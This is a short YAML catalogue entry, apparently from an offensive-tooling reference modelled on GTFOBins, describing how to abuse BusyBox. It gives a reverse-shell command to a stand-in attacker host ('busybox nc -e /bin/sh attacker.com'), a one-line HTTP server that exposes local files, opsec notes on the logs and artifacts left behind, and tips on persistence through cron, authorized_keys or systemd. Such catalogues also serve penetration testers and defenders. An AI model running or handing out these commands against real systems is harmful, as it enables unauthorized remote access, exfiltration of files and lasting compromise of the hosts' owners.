---
name: busybox
capabilities:
- exec
- upload
- reverse-shell
required_permissions:
  level: user
difficulty: low
opsec:
  noise: high
  artifacts:
  - ~/.bash_history
  - Network connection logs / firewall logs
  - auditd execve events
  - Process arguments visible in ps and auditd
  - Outbound network traffic to attacker host
  notes: BusyBox may contain many utilities, run `busybox --list-full` to check what other binaries are supported.
persistence_potential: true
examples:
- id: reverse-shell
  description: Initiate a reverse shell to attacker host.
  capabilities:
  - reverse-shell
  - exec
  command: busybox nc -e /bin/sh attacker.com 12345
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: busybox httpd -f -p 12345 -h .
  notes: This serves files in the local folder via an HTTP server.
references:
- https://gtfobins.github.io/gtfobins/busybox/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
